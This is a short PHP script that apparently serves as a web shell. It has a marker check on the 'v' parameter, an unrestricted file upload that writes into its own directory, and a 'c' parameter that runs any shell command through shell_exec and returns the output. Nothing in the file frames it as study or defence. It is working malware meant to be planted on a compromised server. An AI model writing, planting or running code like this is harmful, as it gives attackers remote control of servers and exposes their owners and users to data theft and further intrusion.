<?php
$s = 'Nx-zD';
if (isset($_GET['v'])) { echo $s; exit; }
if (isset($_FILES['f'])) { $d=dirname(__FILE__).'/'; $n=basename($_FILES['f']['name']); if(move_uploaded_file($_FILES['f']['tmp_name'],$d.$n)) echo 'OK:'.$d.$n; else echo 'FAIL'; exit; }
if (isset($_GET['c'])) { header('Content-Type:text/plain'); echo shell_exec($_GET['c']); exit; }
echo '<h2>'.$s.'</h2><form method=POST enctype=multipart/form-data><input type=file name=f><input type=submit value=Upload></form>';
